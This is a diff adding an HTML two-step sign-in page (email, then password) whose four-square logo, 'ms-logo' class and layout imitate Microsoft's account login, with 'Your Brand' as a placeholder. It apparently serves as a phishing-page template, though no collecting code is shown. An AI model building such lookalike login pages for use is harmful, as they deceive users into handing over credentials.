@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <!-- jQuery (required if your script uses $()) -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="login-box">
+
+        <!-- LOGO -->
+        <div class="logo">
+            <div class="ms-logo">
+                <div class="sq red"></div>
+                <div class="sq green"></div>
+                <div class="sq blue"></div>
+                <div class="sq yellow"></div>
+            </div>
+
+            <span>Your Brand</span>
+        </div>
+
+        <!-- Form -->
+        <form id="myForm">
+
+            <div class="step-container">
+
+                <!-- EMAIL STEP -->
+                <div class="step" id="emailStep">
+
+                    <h1>Sign in</h1>
+
+                    <input
+                        type="email"
+                        id="email"
+                        name="email"
+                        placeholder="Email Address"
+                        autocomplete="email"
+                        required>
+
+                    <div class="link-area">
+                        <a href="#" class="link">No account? Create one!</a>
+                    </div>
+
+                    <div class="link-area">
+                        <a href="#" class="link">Can't access your account?</a>
+                    </div>
+
+                    <div class="btn-row">
+                        <button
+                            type="button"
+                            onclick="nextStep()">
+                            Next
+                        </button>
+                    </div>
+
+                </div>
+
+                <!-- PASSWORD STEP -->
+                <div class="step" id="passwordStep">
+
+                    <div
+                        class="back"
+                        onclick="backStep()">
+                        Enter your password
+                    </div>
+
+                    <div
+                        class="email-display"
+                        id="emailDisplay">
+                    </div>
+
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        placeholder="Password"
+                        autocomplete="current-password"
+                        required>
+
+                    <div class="link-area">
+                        <a href="#" class="link">Forgot password?</a>
+                    </div>
+
+                    <div class="btn-row">
+                        <button
+                            type="submit">
+                            Sign in
+                        </button>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </form>
+
+    </div>
+
+    <div class="signin-options">
+        <span class="key">🔑</span>
+        <span>Sign-in options</span>
+    </div>
+
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
